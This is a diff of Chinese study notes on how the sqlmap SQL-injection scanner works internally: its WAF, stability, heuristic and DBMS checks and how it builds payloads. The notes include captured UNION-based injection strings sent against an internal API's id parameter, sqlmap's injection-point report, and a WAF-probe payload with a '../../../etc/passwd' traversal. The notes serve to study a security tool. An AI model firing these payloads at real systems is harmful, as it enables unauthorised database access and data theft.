@@ -1,19 +1,15 @@
+# 使用
 从Burp或者WebScarab代理中获取日志
 
 参数：-l 从文本中获取多个目标扫描
 
 可以直接吧Burp proxy或者WebScarab proxy中的日志直接倒出来交给sqlmap来一个一个检测是否有注入。
 
-
-
 ---
 
-
-
 ```
-log_format main '=====================================================
-
-
+log_format main '
+=====================================================
 =====================================================
 $request
 Cookie: $http_cookie
@@ -24,8 +20,6 @@ Host: $host
 
 $request_body
 =====================================================
-
-
 ';   
 ```
 
@@ -35,6 +29,7 @@ $request_body
 ---
 # 做了啥子操作？
 
+```
 brandType=401&id=77
 brandType=401&id=77
 brandType=3681&id=77
@@ -45,10 +40,7 @@ brandType=401&id=77,.'((.,(."
 brandType=401&id=6611-6534
 brandType=401&id=77.2fPlP
 brandType=401&id=77'ffVRFy<'">XsvuSc
-
-
-
-
+```
 
 对id开放注入攻击
 
@@ -104,16 +96,13 @@ id=77 UNION ALL SELECT CONCAT(0x716a6a7871,0x666e54546b7259714b63536c53567a62757
 id=77 UNION ALL SELECT NULL,NULL,CONCAT(0x716a6a7871,0x56686d4b7a45524a786e646977705a53796976497946616e58647064464644635a716c63706b4d44,0x7178626b71),NULL,NULL,NULL-- feNc&limit=20&page=1
 id=77 UNION ALL SELECT NULL,NULL,CONCAT(0x716a6a7871,0x56686d4b7a45524a786e646977705a53796976497946616e58647064464644635a716c63706b4d44,0x7178626b71),NULL,NULL,NULL UNION ALL SELECT NULL,NULL,CONCAT(0x716a6a7871,0x5a507853734d786a4362457a446c546b7764656974786748796154777675426742716f6741545342,0x7178626b71),NULL,NULL,NULL-- SgkL&limit=20&page=1
 id=77 UNION ALL SELECT NULL,NULL,CONCAT(0x716a6a7871,0x56686d4b7a45524a786e646977705a53796976497946616e58647064464644635a716c63706b4d44,0x7178626b71),NULL,NULL,NULL FROM (SELECT 0 AS Oshv UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9 UNION SELECT 10 UNION SELECT 11 UNION SELECT 12 UNION SELECT 13 UNION SELECT 14) AS ktvq-- UwHx&limit=20&page=1
-id=77 UNION ALL SELECT NULL,NULL,CONCAT(0x716a6a7871,(CASE WHEN (5052=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                5052) THEN 1 ELSE 0 END),0x7178626b71),NULL,NULL,NULL-- lTkY&limit=20&page=1
+id=77 UNION ALL SELECT NULL,NULL,CONCAT(0x716a6a7871,(CASE WHEN (5052=5052) THEN 1 ELSE 0 END),0x7178626b71),NULL,NULL,NULL-- lTkY&limit=20&page=1
 
 
 ```
 
+结果：sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
 
-sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
-
-
----
 ```
 Parameter: id (GET)
     Type: boolean-based blind
@@ -136,37 +125,62 @@ Parameter: id (GET)
 Target	URL	Place	Parameter	Technique(s)	Note(s)
 http://172.16.8.4:8890/api/brand/product?id=77&limit=20&page=1	GET	id	BETU	
 ```
+---
 
+sqlmap支持五种不同的**注入模式**：
+
+- 基于布尔的盲注，即可以根据返回页面判断条件真假的注入；
+
+- 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；
+
+- 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；
+
+- 联合查询注入，可以使用union的情况下的注入；
+
+- 堆查询注入，可以同时执行**多条语句**的执行时的注入。
 
 ---
 
 
+## checkWaf
+checkWaf()是**检测是否有WAF**,检测方法是NMAP的[http-waf-detect.nse](http://seclists.org/nmap-dev/2011/q2/att-1005/http-waf-detect.nse)。
 
-checkWaf()是检测是否有WAF,检测方法是NMAP的[http-waf-detect.nse](http://seclists.org/nmap-dev/2011/q2/att-1005/http-waf-detect.nse)，比如页面为index.php?id=1，那现在添加一个随机变量index.php?id=1&aaa=2，设置paoyload类似为AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1-- ../../../etc/passwd，如果没有WAF，页面不会变化，如果有WAF，因为payload中有很多敏感字符，大多数时候页面都会发生改变。
-具体通过thirdparty/identywaf/identYwaf.py 去判断是哪个waf，原理应该是通过正则去匹配特征
+比如页面为index.php?id=1，那现在添加一个随机变量index.php?id=1&aaa=2，设置paoyload类似为AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1-- ../../../etc/passwd，如果没有WAF，页面不会变化，如果有WAF，因为payload中有很多敏感字符，大多数时候页面都会发生改变。
+具体通过thirdparty/identywaf/identYwaf.py 去判断是哪个waf，原理应该是通过**正则去匹配特征**
 
+## checkStability
+checkStability 这个函数检查URL内容是否稳定，**在每个请求中两次请求相同的页面，并有一个小的延迟**，以假定它是稳定的。如果请求相同的页面时页面的内容不同，那么动态性可能取决于其他参数，比如实例字符串匹配
 
-checkStability 这个函数检查URL内容是否稳定，在每个请求中两次请求相同的页面，并有一个小的延迟，以假定它是稳定的。如果请求相同的页面时页面的内容不同，那么动态性可能取决于其他参数，比如实例字符串匹配
+> 比较两次请求的延迟
+
+## checkDynParam
 
 lib.controller.checks.checkDynParam
-这个函数检查URL参数是否是动态的。如果是动态的，则页面的内容不同，否则动态性可能取决于另一个参数
+这个函数检查URL参数是否是动态的。如果是动态的，则**页面的内容不同**，否则动态性可能取决于另一个参数
+
+## heuristicCheckSqlInjection
 
 lib.controller.checks.heuristicCheckSqlInjection
-进行启发式 sql 注入检测的前提条件是没有开启 nullConnection 并且页面并不是 heavilyDynamic。
-首先conf.prefix和conf.suffix代表用户指定的前缀和后缀；在while '\'' not in randStr中，随机选择'"', '\'', ')', '(', ',', '.'中的字符，选10个，并且单引号要在。接下来生成一个payload，类似u'name=PAYLOAD_DELIMITER\__1)."."."\'."__PAYLOAD_DELIMITER'。其中PAYLOAD_DELIMITER\__1和__PAYLOAD_DELIMITER是随机字符串。请求网页后，调用parseFilePaths进行解析，查看是否爆出绝对路径，而wasLastResponseDBMSError是判断response中是否包含了数据库的报错信息。
 
-cross-site 
-file inclusion (FI)
-casting detected 
-检测 XSS 的方法其实就是检查 "<'\">"，是否出现在了结果中。作为扩展，我们可以在此检查是否随机字符串还在页面中，从而判断是否存在 XSS 的迹象。
-检测 FI（文件包含），就是检测结果中是否包含了 include/require 等报错信息，这些信息是通过特定正则表达式来匹配检测的。
+进行**启发式 sql 注入检测**的前提条件是没有开启 nullConnection 并且页面并不是 heavilyDynamic。
+
+首先conf.prefix和conf.suffix代表用户指定的前缀和后缀；在while '\'' not in randStr中，随机选择'"', '\'', ')', '(', ',', '.'中的字符，选10个，并且单引号要在。接下来生成一个payload，类似u'name=PAYLOAD_DELIMITER\__1)."."."\'."__PAYLOAD_DELIMITER'。其中PAYLOAD_DELIMITER\__1和__PAYLOAD_DELIMITER是随机字符串。请求网页后，调用parseFilePaths进行解析，**查看是否爆出绝对路径**，而wasLastResponseDBMSError是判断response中是否**包含了数据库的报错信息**。
+
+## cross-site 
+检测 XSS 的方法其实就是**检查 "<'\">"，是否出现在了结果中**。作为扩展，我们可以在此检查是否随机字符串还在页面中，从而判断是否存在 XSS 的迹象。
+
+## file inclusion (FI)
+检测 FI（文件包含），就是检测结果中是否包含了 **include/require 等报错信息**，这些信息是通过特定正则表达式来匹配检测的。
+
+## casting detected 
+
 ![数据处理流程探讨](../images/v2-ca8b016586a9ac0cb1dd4a3db315e29c_r.jpg)
 
 ---
 # checkSqlInjection
 
 lib.controller.checks.checkSqlInjection
-如果DBMS还没有被指纹识别(通过简单的启发式检查或通过DBMS特定的负载)，并且检测到基于布尔的盲识别, 那么尝试使用一个简单的DBMS特定的基于布尔的测试: heuristicCheckDbms，来发现DBMS可能是什么。 找出后，会提示是否跳过测试其他的DBMS。然后，对于测试出来的DBMS，是否用所有的payload来测试。忽略level和risk选项
+如果DBMS还没有被指纹识别(通过简单的启发式检查或通过DBMS特定的负载)，并且检测到基于布尔的盲识别, 那么尝试使用一个简单的DBMS**特定**的**基于布尔的测试**: heuristicCheckDbms，来发现DBMS可能是什么。 找出后，会提示是否跳过测试其他的DBMS。然后，对于测试出来的DBMS，是否用所有的payload来测试。忽略level和risk选项
 
 
 ## heuristicCheckDbms
@@ -178,7 +192,11 @@ lib.controller.checks.checkSqlInjection
 
 ```
 这两个 Payload 的请求判断。
+> 启发式检查，通过伪造不同数据库特性的两个随机数比较语句进行搜查
 
+> 思想都是通过各种请求参数的伪造，和响应返回的判断进行sql注入的搜查。
+
+---
 
 ## test和boundary组合生成payload
 
@@ -240,17 +258,17 @@ where + boundary.prefix+test.payload + test.common + +boundary.suffix
 ```
 
 ### response
-从响应中识别是否成功注入
+从**响应中识别是否成功注入**
 
 - comparison(布尔盲注)：应用比较算法，比较两次请求响应的不同，一次请求的payload使用request子节点中的payload, 另一次请求的payload使用response子节点中的comparison
 
 - grep(报错注入)：响应中匹配的正则表达式
 
-- time(时间盲注和堆叠注入)
+- time(**时间盲注和堆叠注入**)
 
 - 响应返回之前等待的时间(单位为秒)
 
-- union(union注入): 调用 unionTest()函数
+- union(union注入): 调用 unionTest()函数。猜列数、order by
 
 
 lib/controller/checks.py:137
@@ -268,4 +286,3 @@ lib/controller/checks.py:137
 - [从sqlmap源码看如何自定义payload](https://www.anquanke.com/post/id/188173)
 - [sqlmap payload修改之路（下）](https://4hou.win/wordpress/?p=15178)
 - [sqlmap源码解析（六）sqlmap是如何检测注入的](https://x.hacking8.com/post-255.html)
-----
